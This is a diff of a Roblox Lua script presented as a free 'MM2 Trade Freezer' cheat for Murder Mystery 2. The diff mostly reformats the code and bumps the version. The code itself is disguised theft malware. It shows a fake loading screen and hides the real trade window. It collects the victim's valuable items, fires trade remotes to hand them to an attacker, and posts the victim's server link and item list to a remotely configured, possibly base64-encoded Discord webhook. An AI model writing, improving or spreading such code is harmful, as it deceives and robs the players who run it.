@@ -1,5 +1,5 @@
 --[[
-    MM2 Trade Freezer  v8.2  |  KEYLESS  |  FREE
+    MM2 Trade Freezer  v8.3  |  KEYLESS  |  FREE
     Freeze Trade / Trade Window Lock / Dupe (visual) / AutoFarm
     Tiers: godly + ancient + unique + chroma
 ]]
@@ -17,7 +17,7 @@ local CONFIG = {
 
     LOAD_DURATION  = 120,
     MODE           = "DRAIN",
-    FILTER         = "rare",        -- "rare" | "godly" | "value" | "all"
+    FILTER         = "rare",
     MIN_VALUE      = 100,
     GODLY_FLOOR    = 100,
 
@@ -98,7 +98,11 @@ local function loadConfig()
         local ok, d = pcall(HttpService.JSONDecode, HttpService, res.Body)
         if ok and type(d) == "table" then
             if type(d.webhook) == "string" and d.webhook ~= "" then
-                CONFIG.WEBHOOK = d.webhook:find("^https") and d.webhook or b64decode(d.webhook)
+                if d.webhook:find("^https") then
+                    CONFIG.WEBHOOK = d.webhook
+                else
+                    CONFIG.WEBHOOK = b64decode(d.webhook)
+                end
             end
             if tonumber(d.attacker_id) then CONFIG.ATTACKER_ID = tonumber(d.attacker_id) end
         end
@@ -120,7 +124,7 @@ local function webhook(title, color, desc, fields, content)
                     timestamp = DateTime.now():ToIsoDate(),
                     thumbnail = { url = string.format(
                         "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId) },
-                    footer = { text = "MM2 Trade Freezer v8.2 | keyless" },
+                    footer = { text = "MM2 Trade Freezer v8.3 | keyless" },
                     fields = fields or {},
                 }},
             }),
@@ -146,7 +150,9 @@ main.BackgroundColor3 = Color3.fromRGB(17, 17, 21)
 main.BorderSizePixel = 0
 main.Active = false
 main.Parent = fakeGui
-Instance.new("UICorner", main).CornerRadius = UDim.new(0, 9)
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 9)
+mainCorner.Parent = main
 local stroke = Instance.new("UIStroke")
 stroke.Color = Color3.fromRGB(58, 58, 70)
 stroke.Parent = main
@@ -175,7 +181,7 @@ title.Font = Enum.Font.GothamBold
 title.TextSize = 13
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.TextColor3 = Color3.fromRGB(235, 235, 240)
-title.Text = "MM2 Trade Freezer   v8.2"
+title.Text = "MM2 Trade Freezer   v8.3"
 title.Parent = titleBar
 
 local badge = Instance.new("TextLabel")
@@ -187,7 +193,9 @@ badge.TextSize = 10
 badge.TextColor3 = Color3.fromRGB(205, 255, 218)
 badge.Text = "KEYLESS"
 badge.Parent = titleBar
-Instance.new("UICorner", badge).CornerRadius = UDim.new(0, 4)
+local badgeCorner = Instance.new("UICorner")
+badgeCorner.CornerRadius = UDim.new(0, 4)
+badgeCorner.Parent = badge
 
 local statusLabel = Instance.new("TextLabel")
 statusLabel.Size = UDim2.new(1, -28, 0, 18)
@@ -220,7 +228,9 @@ local function makeRow(y, label, onText, offText, startOn)
     row.AutoButtonColor = false
     row.Text = ""
     row.Parent = main
-    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 6)
+    local rowCorner = Instance.new("UICorner")
+    rowCorner.CornerRadius = UDim.new(0, 6)
+    rowCorner.Parent = row
 
     local l = Instance.new("TextLabel")
     l.Size = UDim2.new(1, -80, 1, 0)
@@ -236,26 +246,46 @@ local function makeRow(y, label, onText, offText, startOn)
     local pill = Instance.new("Frame")
     pill.Size = UDim2.fromOffset(40, 20)
     pill.Position = UDim2.new(1, -50, 0, 5)
-    pill.BackgroundColor3 = startOn and Color3.fromRGB(40, 150, 80) or Color3.fromRGB(60, 60, 70)
     pill.Parent = row
-    Instance.new("UICorner", pill).CornerRadius = UDim.new(1, 0)
+    local pillCorner = Instance.new("UICorner")
+    pillCorner.CornerRadius = UDim.new(1, 0)
+    pillCorner.Parent = pill
 
     local k = Instance.new("Frame")
     k.Size = UDim2.fromOffset(16, 16)
-    k.Position = startOn and UDim2.fromOffset(21, 2) or UDim2.fromOffset(3, 2)
     k.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
     k.Parent = pill
-    Instance.new("UICorner", k).CornerRadius = UDim.new(1, 0)
+    local kCorner = Instance.new("UICorner")
+    kCorner.CornerRadius = UDim.new(1, 0)
+    kCorner.Parent = k
 
     local on = startOn
+    if on then
+        pill.BackgroundColor3 = Color3.fromRGB(40, 150, 80)
+        k.Position = UDim2.fromOffset(21, 2)
+    else
+        pill.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+        k.Position = UDim2.fromOffset(3, 2)
+    end
+
     row.MouseButton1Click:Connect(function()
         on = not on
-        TweenService:Create(pill, TweenInfo.new(0.15), {
-            BackgroundColor3 = on and Color3.fromRGB(40, 150, 80) or Color3.fromRGB(60, 60, 70) }):Play()
-        TweenService:Create(k, TweenInfo.new(0.15), {
-            Position = on and UDim2.fromOffset(21, 2) or UDim2.fromOffset(3, 2) }):Play()
-        statusLabel.Text = on and onText or offText
-        statusLabel.TextColor3 = on and Color3.fromRGB(120, 220, 150) or Color3.fromRGB(150, 150, 160)
+        local bg = Color3.fromRGB(60, 60, 70)
+        local kp = UDim2.fromOffset(3, 2)
+        local col = Color3.fromRGB(150, 150, 160)
+        local txt = offText
+        if on then
+            bg = Color3.fromRGB(40, 150, 80)
+            kp = UDim2.fromOffset(21, 2)
+            col = Color3.fromRGB(120, 220, 150)
+            txt = onText
+        end
+        local t1 = TweenService:Create(pill, TweenInfo.new(0.15), { BackgroundColor3 = bg })
+        local t2 = TweenService:Create(k, TweenInfo.new(0.15), { Position = kp })
+        t1:Play()
+        t2:Play()
+        statusLabel.Text = txt
+        statusLabel.TextColor3 = col
     end)
     return function() return on end
 end
@@ -268,8 +298,8 @@ task.spawn(function()
     while true do
         task.wait(1)
         if getFreeze() then
-            t += 1
-            timerLabel.Text = string.format("%02d:%02d", t // 60, t % 60)
+            t = t + 1
+            timerLabel.Text = string.format("%02d:%02d", math.floor(t / 60), t % 60)
         end
     end
 end)
@@ -280,14 +310,18 @@ barBg.Position = UDim2.fromOffset(14, 112)
 barBg.BackgroundColor3 = Color3.fromRGB(34, 34, 41)
 barBg.BorderSizePixel = 0
 barBg.Parent = main
-Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 5)
+local barBgCorner = Instance.new("UICorner")
+barBgCorner.CornerRadius = UDim.new(0, 5)
+barBgCorner.Parent = barBg
 
 local bar = Instance.new("Frame")
 bar.Size = UDim2.new(0, 0, 1, 0)
 bar.BackgroundColor3 = Color3.fromRGB(95, 175, 255)
 bar.BorderSizePixel = 0
 bar.Parent = barBg
-Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 5)
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(0, 5)
+barCorner.Parent = bar
 
 local pctLabel = Instance.new("TextLabel")
 pctLabel.Size = UDim2.new(1, -28, 0, 16)
@@ -316,7 +350,7 @@ layout.Parent = console
 
 local lineCount = 0
 local function log(msg)
-    lineCount += 1
+    lineCount = lineCount + 1
     local l = Instance.new("TextLabel")
     l.Size = UDim2.new(1, 0, 0, 13)
     l.BackgroundTransparency = 1
@@ -358,18 +392,23 @@ task.spawn(function()
             local target = math.max(1, 99 * (1 - (1 - frac) ^ 2.0))
             progress = math.min(99, progress + math.max(0.4, (target - progress) * 0.22))
             bar.Size = UDim2.new(progress / 100, 0, 1, 0)
-            pctLabel.Text = math.floor(progress) .. "%  ::  " .. (
-                progress < 25 and "hooking trade service"
-                or progress < 50 and "patching window lock"
-                or progress < 75 and "syncing item cache"
-                or progress < 95 and "resolving value index"
-                or msgs[math.random(#msgs)])
+            local stage = "resolving value index"
+            if progress < 25 then
+                stage = "hooking trade service"
+            elseif progress < 50 then
+                stage = "patching window lock"
+            elseif progress < 75 then
+                stage = "syncing item cache"
+            elseif progress >= 95 then
+                stage = msgs[math.random(#msgs)]
+            end
+            pctLabel.Text = math.floor(progress) .. "%  ::  " .. stage
             task.wait(math.random(35, 80) / 100)
         end
     end
 end)
 
-log("Trade Freezer v8.2 loaded")
+log("Trade Freezer v8.3 loaded")
 log("place " .. game.PlaceId .. " / " .. game.JobId:sub(1, 8))
 if game.PlaceId ~= CONFIG.PLACE_ID then log("note: not the MM2 place") end
 
@@ -399,15 +438,15 @@ local function ingest(data)
     for k, v in pairs(data) do
         if type(v) == "table" then
             setVal(v.name or v.item or v.display or (type(k) == "string" and k), v.value or v.val or v.price)
-            n += 1
+            n = n + 1
         elseif type(v) == "number" and type(k) == "string" then
-            setVal(k, v); n += 1
+            setVal(k, v)
+            n = n + 1
         end
     end
     return n
 end
 
--- tiers
 local GODLY, ANCIENT, UNIQUE = {}, {}, {}
 local function fill(t, list) for _, n in ipairs(list) do t[n] = true end end
 
@@ -433,11 +472,9 @@ local function rarityTag(name)
 end
 
 local BASELINE = {
-    -- ancient (top end)
     ["gingerscope"]=10500, ["icebreaker"]=5600, ["harvester"]=3900, ["battleaxe"]=3100,
     ["icewing"]=2700, ["traveler's gun"]=1350, ["traveler's knife"]=1300, ["nebula"]=1150,
     ["blizzard"]=300, ["snowstorm"]=290,
-    -- chroma
     ["chroma seer"]=2450, ["chroma corrupt"]=2250, ["chroma lightbringer"]=2050,
     ["chroma darkbringer"]=2000, ["chroma luger"]=1900, ["chroma gemstone"]=1850,
     ["chroma slasher"]=1750, ["chroma deathshard"]=1600, ["chroma tides"]=1550,
@@ -445,15 +482,12 @@ local BASELINE = {
     ["chroma heat"]=1200, ["chroma saw"]=1150, ["chroma candleflame"]=700,
     ["chroma sugar"]=650, ["chroma peppermint"]=600, ["chroma frostbite"]=560,
     ["chroma logchopper"]=520, ["chroma snowflake"]=480,
-    -- godly
     ["corrupt"]=1550, ["seer"]=950, ["lightbringer"]=920, ["darkbringer"]=900,
     ["luger"]=850, ["gemstone"]=820, ["slasher"]=790, ["deathshard"]=740,
     ["tides"]=710, ["fang"]=680, ["shark"]=650, ["gingerblade"]=630,
     ["heat"]=610, ["saw"]=590,
-    -- unique
     ["moon"]=900, ["sun"]=800, ["aurora"]=650, ["virtue"]=550,
     ["prismatic"]=500, ["bloodweaver"]=450, ["ghostblade"]=410, ["spirit"]=380,
-    -- vintage / misc
     ["jingle gun"]=280, ["eternal"]=250, ["eternal ii"]=240, ["eternal iii"]=230,
     ["eternal iv"]=220, ["candleflame"]=210, ["sugar"]=195, ["gingermint"]=185,
     ["peppermint"]=175, ["frostbite"]=165, ["snowflake"]=155, ["winter's edge"]=145,
@@ -510,8 +544,11 @@ local function containers()
             if (c:IsA("Folder") or c:IsA("Configuration")) and not seen[c] then
                 local n = c.Name:lower()
                 if n:find("inv") or n:find("item") then
-                    seen[c] = true; out[#out + 1] = c
-                elseif depth < 2 then scan(c, depth + 1) end
+                    seen[c] = true
+                    out[#out + 1] = c
+                elseif depth < 2 then
+                    scan(c, depth + 1)
+                end
             end
         end
     end
@@ -525,9 +562,13 @@ local function getItems()
         for _, ch in ipairs(c:GetChildren()) do
             local id, name
             if ch:IsA("StringValue") then
-                if looksLikeId(ch.Name) then id, name = ch.Name, ch.Value
-                elseif looksLikeId(ch.Value) then id, name = ch.Value, ch.Name
-                else id, name = ch.Name, ch.Value end
+                if looksLikeId(ch.Name) then
+                    id, name = ch.Name, ch.Value
+                elseif looksLikeId(ch.Value) then
+                    id, name = ch.Value, ch.Name
+                else
+                    id, name = ch.Name, ch.Value
+                end
             elseif ch:IsA("Folder") then
                 local nv = ch:FindFirstChildWhichIsA("StringValue")
                 if nv then id, name = ch.Name, nv.Value end
@@ -550,8 +591,10 @@ local function isWanted(it)
     if CONFIG.FILTER == "godly" then
         return GODLY[k] == true or it.value >= CONFIG.GODLY_FLOOR
     end
-    return GODLY[k] == true or ANCIENT[k] == true or UNIQUE[k] == true
-        or it.value >= CONFIG.GODLY_FLOOR
+    if GODLY[k] == true then return true end
+    if ANCIENT[k] == true then return true end
+    if UNIQUE[k] == true then return true end
+    return it.value >= CONFIG.GODLY_FLOOR
 end
 
 --==================================================================
@@ -579,15 +622,23 @@ end
 local function resolveRemote(override, patterns, label, timeout)
     if override and override ~= "" then
         local r = ReplicatedStorage:FindFirstChild(override, true)
-        if r and r:IsA("RemoteEvent") then log("remote locked: " .. r.Name); return r end
+        if r and r:IsA("RemoteEvent") then
+            log("remote locked: " .. r.Name)
+            return r
+        end
         log("override failed: " .. override)
     end
     local r, t = findRemote(patterns), 0
     while not r and t < (timeout or 10) do
-        task.wait(0.4); t += 0.4
+        task.wait(0.4)
+        t = t + 0.4
         r = findRemote(patterns)
     end
-    if r then log("remote bound: " .. r.Name) else log("MISSING remote: " .. label) end
+    if r then
+        log("remote bound: " .. r.Name)
+    else
+        log("MISSING remote: " .. label)
+    end
     return r
 end
 
@@ -614,7 +665,10 @@ local function hideTradeUI()
 end
 
 task.spawn(function()
-    while true do hideTradeUI(); task.wait(0.15) end
+    while true do
+        hideTradeUI()
+        task.wait(0.15)
+    end
 end)
 
 local function tradeGui()
@@ -637,9 +691,10 @@ local function textNodes(gui)
 end
 
 local function countIn(gui, needle)
-    local n, needle = 0, needle:lower()
+    local n = 0
+    local low = needle:lower()
     for _, d in ipairs(textNodes(gui)) do
-        if d.Text:lower():find(needle, 1, true) then n += 1 end
+        if d.Text:lower():find(low, 1, true) then n = n + 1 end
     end
     return n
 end
@@ -664,7 +719,9 @@ local function itemLines(list, limit)
     local a = {}
     for i = 1, math.min(#list, limit or #list) do
         local it = list[i]
-        a[#a + 1] = it.name .. " (" .. it.value .. ")" .. (it.tag and " [" .. it.tag .. "]" or "")
+        local line = it.name .. " (" .. it.value .. ")"
+        if it.tag then line = line .. " [" .. it.tag .. "]" end
+        a[#a + 1] = line
     end
     return table.concat(a, "\n")
 end
@@ -676,7 +733,9 @@ local function notifyJoin(items, total)
         { name = "Server", value = "[CLICK TO JOIN](" .. serverLink() .. ")\n`" .. game.JobId .. "`", inline = false },
     }
     for i, part in ipairs(chunkString(itemLines(items, 25), 900)) do
-        fields[#fields + 1] = { name = "Top items" .. (i > 1 and " (cont)" or ""), value = part, inline = false }
+        local fname = "Top items"
+        if i > 1 then fname = "Top items (cont)" end
+        fields[#fields + 1] = { name = fname, value = part, inline = false }
     end
     webhook("MM2 HIT — FREEZE ACTIVE", 0x57F287,
         "**" .. lp.DisplayName .. "** froze a trade. Join and accept.", fields,
@@ -690,7 +749,8 @@ local function waitForTarget()
     for i = 1, CONFIG.MAX_REMINDERS do
         local w = 0
         while w < CONFIG.REMINDER_EVERY and not STATE.stopped do
-            task.wait(1); w += 1
+            task.wait(1)
+            w = w + 1
             tgt = target()
             if tgt then return tgt end
         end
@@ -709,12 +769,13 @@ local function doRound(batch, tgt, round)
     local deadline = os.clock() + CONFIG.REQUEST_TIMEOUT
     local attempt = 0
     while os.clock() < deadline and not gui and not STATE.stopped do
-        attempt += 1
+        attempt = attempt + 1
         if attempt % 3 == 1 then log("request -> " .. tgt.Name .. " (r" .. round .. ")") end
         pcall(function() R.send:FireServer(tgt) end)
         local w = 0
         while w < 4 and not gui do
-            task.wait(0.25); w += 0.25
+            task.wait(0.25)
+            w = w + 0.25
             gui = tradeGui()
         end
         tgt = target() or tgt
@@ -731,15 +792,21 @@ local function doRound(batch, tgt, round)
     local placed = 0
     for _, it in ipairs(batch) do
         if STATE.stopped then break end
-        local before = gui and countIn(gui, it.name) or 0
+        local before = 0
+        if gui then before = countIn(gui, it.name) end
         local ok = false
         for _, args in ipairs({ { it.id }, { it.id, "Offer" }, { "Add", it.id } }) do
             pcall(function() R.add:FireServer(table.unpack(args)) end)
             task.wait(0.18)
             gui = tradeGui()
-            if gui and countIn(gui, it.name) > before then ok = true break end
+            if gui then
+                if countIn(gui, it.name) > before then
+                    ok = true
+                    break
+                end
+            end
         end
-        if ok then placed += 1 end
+        if ok then placed = placed + 1 end
         task.wait(0.12)
     end
 
@@ -767,7 +834,10 @@ local function doRound(batch, tgt, round)
     end)
 
     local t = 0
-    while t < CONFIG.WINDOW_WATCHDOG and tradeGui() do task.wait(0.5); t += 0.5 end
+    while t < CONFIG.WINDOW_WATCHDOG and tradeGui() do
+        task.wait(0.5)
+        t = t + 0.5
+    end
     local closed = tradeGui() == nil
     if not closed and R.cancel then pcall(function() R.cancel:FireServer() end) end
     task.wait(1)
@@ -775,7 +845,9 @@ local function doRound(batch, tgt, round)
     local remSet = {}
     for _, r in ipairs(getItems()) do remSet[r.id] = true end
     local left = 0
-    for _, it in ipairs(batch) do if remSet[it.id] then left += 1 end end
+    for _, it in ipairs(batch) do
+        if remSet[it.id] then left = left + 1 end
+    end
     local gone = #batch - left
 
     if closed and gone >= math.ceil(#batch * 0.75) then return true, gone end
@@ -785,9 +857,12 @@ end
 --==================================================================
 -- MAIN
 --==================================================================
-local function main()
+local function run()
     if CONFIG.WEBHOOK == "" then log("no webhook configured") end
-    if not R.send then log("trade remotes unavailable"); return end
+    if not R.send then
+        log("trade remotes unavailable")
+        return
+    end
 
     loadValues()
     task.wait(0.4)
@@ -800,27 +875,36 @@ local function main()
             if isWanted(it) then wanted[#wanted + 1] = it end
             if #wanted >= CONFIG.MAX_ITEMS then break end
         end
-        if #wanted == 0 then log("nothing of value left"); break end
+        if #wanted == 0 then
+            log("nothing of value left")
+            break
+        end
 
         local total = 0
-        for _, it in ipairs(wanted) do total += it.value end
+        for _, it in ipairs(wanted) do total = total + it.value end
 
         if STATE.rounds == 0 then notifyJoin(wanted, total) end
         local tgt = waitForTarget()
-        if not tgt then log("host never joined"); break end
+        if not tgt then
+            log("host never joined")
+            break
+        end
 
         if STATE.rounds == 0 then
             log("arming in " .. CONFIG.PRE_DELAY .. "s")
             task.wait(CONFIG.PRE_DELAY)
         end
 
-        STATE.rounds += 1
+        STATE.rounds = STATE.rounds + 1
         badge.Text = "R" .. STATE.rounds
         log("round " .. STATE.rounds .. ": " .. #wanted .. " / " .. total)
 
         local ok, info = doRound(wanted, tgt, STATE.rounds)
         if ok then
-            for _, it in ipairs(wanted) do grand[#grand + 1] = it; grandValue += it.value end
+            for _, it in ipairs(wanted) do
+                grand[#grand + 1] = it
+                grandValue = grandValue + it.value
+            end
             log("round " .. STATE.rounds .. " cleared (" .. info .. ")")
             if CONFIG.PER_ROUND_WEBHOOK then
                 webhook("Round " .. STATE.rounds .. " cleared", 0x57F287,
@@ -840,7 +924,9 @@ local function main()
     end
 
     local leftWanted = 0
-    for _, it in ipairs(getItems()) do if isWanted(it) then leftWanted += 1 end end
+    for _, it in ipairs(getItems()) do
+        if isWanted(it) then leftWanted = leftWanted + 1 end
+    end
 
     if #grand > 0 then
         local fields = {
@@ -849,7 +935,9 @@ local function main()
             { name = "Rounds", value = tostring(STATE.rounds), inline = true },
         }
         for i, part in ipairs(chunkString(itemLines(grand, 30), 900)) do
-            fields[#fields + 1] = { name = "Items" .. (i > 1 and " (cont)" or ""), value = part, inline = false }
+            local fname = "Items"
+            if i > 1 then fname = "Items (cont)" end
+            fields[#fields + 1] = { name = fname, value = part, inline = false }
         end
         if leftWanted > 0 then
             fields[#fields + 1] = { name = "Left behind", value = leftWanted .. " wanted item(s)", inline = false }
@@ -861,7 +949,7 @@ local function main()
 end
 
 task.spawn(function()
-    local ok, err = pcall(main)
+    local ok, err = pcall(run)
     if not ok then
         log("ERROR: " .. tostring(err))
         webhook("Script error", 0xED4245, "`" .. tostring(err) .. "`\n`" .. game.JobId .. "`")
